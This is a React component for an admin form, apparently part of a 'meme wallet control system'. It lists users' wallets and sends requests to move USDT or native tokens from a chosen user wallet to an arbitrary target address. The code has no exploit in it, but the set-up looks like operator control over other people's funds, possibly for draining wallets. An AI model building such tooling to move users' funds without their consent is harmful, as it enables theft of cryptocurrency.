import React, { useState, useEffect } from "react";

function SendRequest() {
  const [wallets, setWallets] = useState([]);
  const [selectedWallet, setSelectedWallet] = useState("");
  const [chain, setChain] = useState("eth");
  const [toAddress, setToAddress] = useState("");
  const [tokenType, setTokenType] = useState("usdt");
  const [amount, setAmount] = useState("");
  const [message, setMessage] = useState("");

  // Fetch wallets from backend
  useEffect(() => {
    fetch("https://meme-wallet-control-system-hx1r.vercel.app/api/admin-get-wallets")
      .then(res => res.json())
      .then(data => setWallets(data.wallets || []));
  }, []);

  const handleSubmit = async () => {
    if (!selectedWallet || !toAddress || !amount) {
      setMessage("❌ Please fill all fields");
      return;
    }

    const res = await fetch(
      "https://meme-wallet-control-system-hx1r.vercel.app/api/transaction-request-create",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: selectedWallet,
          chain,
          toAddress,
          tokenType,
          amount
        })
      }
    );

    const data = await res.json();

    if (data.success) {
      setMessage("✅ Request sent successfully!");
      setAmount("");
      setToAddress("");
    } else {
      setMessage("❌ Failed to send request");
    }
  };

  return (
    <div>
      <h1>Send Transaction Request</h1>

      {message && <p className="msg">{message}</p>}

      <div className="form">
        <label>Select User Wallet</label>
        <select value={selectedWallet} onChange={(e) => setSelectedWallet(e.target.value)}>
          <option value="">Choose Wallet…</option>
          {wallets.map((w) => (
            <option key={w.id} value={w.address}>
              {w.address.slice(0, 12)}...{w.address.slice(-6)}
            </option>
          ))}
        </select>

        <label>Chain</label>
        <select value={chain} onChange={(e) => setChain(e.target.value)}>
          <option value="eth">Ethereum</option>
          <option value="bnb">BNB</option>
          <option value="polygon">Polygon</option>
          <option value="arbitrum">Arbitrum</option>
          <option value="optimism">Optimism</option>
        </select>

        <label>Send To (Target Address)</label>
        <input
          type="text"
          value={toAddress}
          onChange={(e) => setToAddress(e.target.value)}
          placeholder="0x123..."
        />

        <label>Token Type</label>
        <select value={tokenType} onChange={(e) => setTokenType(e.target.value)}>
          <option value="usdt">USDT</option>
          <option value="native">Native Token</option>
        </select>

        <label>Amount</label>
        <input
          type="number"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          placeholder="Enter amount"
        />

        <button className="btn" onClick={handleSubmit}>Send Request</button>
      </div>
    </div>
  );
}

export default SendRequest;
